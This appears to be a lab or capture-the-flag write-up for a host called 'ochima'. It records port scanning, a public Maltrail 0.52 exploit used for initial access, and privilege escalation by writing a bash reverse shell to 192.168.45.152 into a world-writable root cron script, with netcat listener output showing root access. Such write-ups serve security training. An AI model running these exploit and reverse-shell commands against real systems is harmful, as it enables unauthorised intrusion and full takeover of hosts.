## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.181.32
# HOSTNAME                                     // Found post initial foothold
ochima
# OPERATING SYSTEM                             // Found post initial foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
8338/tcp open  unknown syn-ack ttl 61
```
# ENUMERATION
## PORT 80
```bash
export url=http://$ip

# Findings
- Server: Apache/2.4.52 (Ubuntu)
- Title - [Apache2 Ubuntu Default Page: It works]


# Commands used
sudo curl -I $url
sudo whatweb $url | sed 's/,/\n/g'


```
## PORT 8338
```bash
export url=http://$ip:8338

# Findings
- Server: Maltrail/0.52

# Commands used
sudo curl -I $url
sudo whatweb $url | sed 's/,/\n/g'
```

## INITIAL FOOTHOLD
```bash
# Found Exploit for Maltrail
- Exploit
	- https://github.com/spookier/Maltrail-v0.53-Exploit

python3 exploit.py 192.168.45.152 80 $url                               
Running exploit on http://192.168.181.32:8338/login

sudo nc -nvlp 80                                            
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.181.32] 42462
$ id
id
```
## PRIVILEGE ESCALATION
```bash
- Run pspy
2024/12/11 17:58:01 CMD: UID=0     PID=28778  | /bin/sh -c /var/backups/etc_Backup.sh 

snort@ochima:/var/backups$ ls -la /var/backups/etc_Backup.sh
-rwxrwxrwx 1 root root 55 Dec 11 17:58 /var/backups/etc_Backup.sh

snort@ochima:/var/backups$ cat etc_Backup.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.152/80 0>&1

sudo nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.181.32] 50068
bash: cannot set terminal process group (28797): Inappropriate ioctl for device
bash: no job control in this shell
root@ochima:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ochima:~# whoami
whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Wed Dec 11 22:28:38 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.181.32
Nmap scan report for 192.168.181.32
Host is up, received echo-reply ttl 61 (0.041s latency).
Scanned at 2024-12-11 22:28:40 IST for 218s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8338/tcp open  unknown syn-ack ttl 61
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Maltrail/0.52
|     Date: Wed, 11 Dec 2024 17:00:48 GMT
|     Connection: close
|     Content-Type: text/html
|     Last-Modified: Sat, 31 Dec 2022 22:58:57 GMT
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
|     Cache-Control: no-cache
|     Content-Length: 7091
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="text/html;charset=utf8">
|     <meta name="viewport" content="width=device-width, user-scalable=no">
|     <meta name="robots" content="noindex, nofollow">
|     <title>Maltrail</title>
|     <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
|     <link rel="stylesheet" type="text/css" hre
|   HTTPOptions: 
|     HTTP/1.0 501 Unsupported method ('OPTIONS')
|     Server: Maltrail/0.52
|     Date: Wed, 11 Dec 2024 17:00:49 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8338-TCP:V=7.94SVN%I=7%D=12/11%Time=6759C542%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1759,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20Maltrail/0\.52\
SF:r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2017:00:48\x20GMT\r\nConnection:
SF:\x20close\r\nContent-Type:\x20text/html\r\nLast-Modified:\x20Sat,\x2031
SF:\x20Dec\x202022\x2022:58:57\x20GMT\r\nContent-Security-Policy:\x20defau
SF:lt-src\x20'self';\x20style-src\x20'self'\x20'unsafe-inline';\x20img-src
SF:\x20\*\x20blob:;\x20script-src\x20'self'\x20'unsafe-eval'\x20https://st
SF:at\.ripe\.net;\x20frame-src\x20\*;\x20object-src\x20'none';\x20block-al
SF:l-mixed-content;\r\nCache-Control:\x20no-cache\r\nContent-Length:\x2070
SF:91\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<h
SF:ead>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compat
SF:ible\"\x20content=\"IE=edge\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x
SF:20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf8\">\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"
SF:width=device-width,\x20user-scalable=no\">\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollow\">\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<title>Maltrail</title>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href
SF:=\"css/thirdparty\.min\.css\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x
SF:20rel=\"stylesheet\"\x20type=\"text/css\"\x20hre")%r(HTTPOptions,2AE,"H
SF:TTP/1\.0\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nServer:\x2
SF:0Maltrail/0\.52\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2017:00:49\x20GM
SF:T\r\nConnection:\x20close\r\nContent-Type:\x20text/html;charset=utf-8\r
SF:\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C
SF://DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://
SF:www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20501</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupported\x20method\x20\('OPTIO
SF:NS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explan
SF:ation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20Server\x20does\x20not\x20
SF:support\x20this\x20operation\.</p>\n\x20\x20\x20\x20</body>\n</html>\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 22:32:18 2024 -- 1 IP address (1 host up) scanned in 219.92 seconds
```

